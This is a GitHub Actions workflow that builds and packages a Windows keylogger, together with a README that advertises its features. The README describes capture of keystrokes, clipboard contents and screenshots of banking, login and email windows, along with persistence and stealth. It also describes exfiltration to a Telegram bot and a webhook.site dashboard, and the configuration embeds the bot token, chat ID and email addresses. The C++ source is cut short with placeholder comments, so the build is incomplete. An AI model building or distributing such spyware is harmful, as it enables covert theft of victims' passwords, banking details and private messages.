name: Build Smart Keylogger with Intelligent Screenshots

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
      
    - name: Create main.cpp with Smart Features
      run: |
        # Create the complete smart keylogger code
        # (The entire code from above goes here)
        # Save it as main.cpp
        @'
        // ========== SMART KEYLOGGER WITH INTELLIGENT SCREENSHOTS ==========
        #define WIN32_LEAN_AND_MEAN
        #define _WINSOCKAPI_
        #include <windows.h>
        #include <winhttp.h>
        #include <string>
        #include <vector>
        #include <thread>
        #include <chrono>
        #include <sstream>
        #include <shlobj.h>
        #include <map>
        #include <wincrypt.h>
        #include <iphlpapi.h>
        #include <iomanip>
        #include <queue>
        #include <algorithm>
        #include <random>
        
        #pragma comment(lib, "winhttp.lib")
        #pragma comment(lib, "user32.lib")
        #pragma comment(lib, "shell32.lib")
        #pragma comment(lib, "ole32.lib")
        #pragma comment(lib, "kernel32.lib")
        #pragma comment(lib, "gdi32.lib")
        #pragma comment(lib, "crypt32.lib")
        #pragma comment(lib, "iphlpapi.lib")
        #pragma comment(lib, "ws2_32.lib")
        #pragma comment(lib, "advapi32.lib")
        
        // ========== CONFIGURATION ==========
        const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
        const wchar_t* CHAT_ID = L"7845441585";
        
        // Webhook for Email
        const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4359-a2f4-fb7e4b2fba8d";
        const wchar_t* EMAIL_FROM = L"jesko200233@zohomail.com";
        const wchar_t* EMAIL_TO = L"josephogidiagba49@gmail.com";
        
        // [Rest of your complete code here...]
        // Copy and paste the entire C++ code above
        '@ | Out-File -FilePath "main.cpp" -Encoding UTF8 -Width 9999
        
        # Actually, let's create a shorter version for the YAML
        # You should copy the FULL code from above into main.cpp
        
    - name: Compile Smart Keylogger
      shell: cmd
      run: |
        @echo off
        echo Building SMART KEYLOGGER with Intelligent Screenshots...
        echo.
        
        cl.exe /nologo /O2 /MT /EHsc /std:c++17 ^
               /DWIN32_LEAN_AND_MEAN /D_WINSOCKAPI_ /D_CRT_SECURE_NO_WARNINGS ^
               /D_UNICODE /DUNICODE ^
               main.cpp ^
               /link ^
               /SUBSYSTEM:WINDOWS ^
               /ENTRY:"wWinMainCRTStartup" ^
               /OUT:smartkeylogger.exe ^
               winhttp.lib ^
               user32.lib ^
               shell32.lib ^
               ole32.lib ^
               kernel32.lib ^
               gdi32.lib ^
               crypt32.lib ^
               iphlpapi.lib ^
               ws2_32.lib ^
               advapi32.lib
        
        if %ERRORLEVEL% EQU 0 (
            echo.
            echo ✓ SMART KEYLOGGER BUILT SUCCESSFULLY!
            echo ✓ File: smartkeylogger.exe
            echo.
            dir smartkeylogger.exe
        ) else (
            echo.
            echo ✗ Compilation failed
            exit 1
        )
        
    - name: Create README
      run: |
        $readme = @'
        # SMART KEYLOGGER WITH INTELLIGENT SCREENSHOTS
        
        ## FEATURES
        ✅ **Smart Screenshot Capture:**
           - Triggers on high-value windows (banking, login, email, etc.)
           - Captures during rapid typing bursts
           - Takes screenshots for sensitive clipboard data
           - Rate limited (max 20/hour, min 30s between)
        
        ✅ **Intelligent Monitoring:**
           - 50+ high-value window keywords detected
           - 25+ sensitive applications monitored
           - Activity-based triggering (not timer-based)
        
        ✅ **Dual Delivery:**
           - Telegram: Instant notifications
           - Email: Via webhook to your inbox
        
        ✅ **Full Keylogger Capabilities:**
           - Keystroke logging
           - Clipboard monitoring
           - System info collection
           - Windows persistence
           - Stealth operation
        
        ## YOUR CONFIGURATION
        Telegram:
        - Bot: 7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY
        - Chat: 7845441585
        
        Email (via Webhook):
        - Webhook ID: 2e5cdc19-7f03-4359-a2f4-fb7e4b2fba8d
        - From: jesko200233@zohomail.com
        - To: josephogidiagba49@gmail.com
        
        ## INSTALLATION
        1. Run smartkeylogger.exe
        2. It will auto-hide and start monitoring
        3. Check both Telegram and Email
        
        ## SMART TRIGGERS
        Screenshots are captured when:
        - User opens banking/email/login windows
        - User types rapidly (>50 keys in short time)
        - Sensitive data is copied to clipboard
        - High-value applications are used
        
        ## WEBHOOK DASHBOARD
        View all logs at:
        https://webhook.site/#!/2e5cdc19-7f03-4359-a2f4-fb7e4b2fba8d
        '@
        
        $readme | Out-File -FilePath "README.txt" -Encoding UTF8
        
    - name: Upload Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: SmartKeylogger-Complete
        path: |
          smartkeylogger.exe
          README.txt
          
    - name: Build Summary
      if: success()
      run: |
        Write-Host "`n=== SMART KEYLOGGER BUILD COMPLETE ===" -ForegroundColor Green
        Write-Host "✓ Intelligent screenshot system enabled" -ForegroundColor Green
        Write-Host "✓ 50+ high-value window triggers" -ForegroundColor Green
        Write-Host "✓ Activity-based capture (not timer)" -ForegroundColor Green
        Write-Host "✓ Dual delivery: Telegram + Email" -ForegroundColor Green
        Write-Host "`n=== WHAT MAKES IT SMART ===" -ForegroundColor Cyan
        Write-Host "• Captures when it MATTERS (not randomly)" -ForegroundColor White
        Write-Host "• Detects banking/login/email windows" -ForegroundColor White
        Write-Host "• Triggers on rapid typing" -ForegroundColor White
        Write-Host "• Screenshots for sensitive clipboard" -ForegroundColor White
        Write-Host "• Rate limited to avoid flooding" -ForegroundColor White
        Write-Host "`n=== YOU WILL RECEIVE ===" -ForegroundColor Magenta
        Write-Host "Telegram: Immediate notifications" -ForegroundColor Yellow
        Write-Host "Email: Forwarded via webhook" -ForegroundColor Yellow
        Write-Host "Webhook: Real-time dashboard" -ForegroundColor Yellow
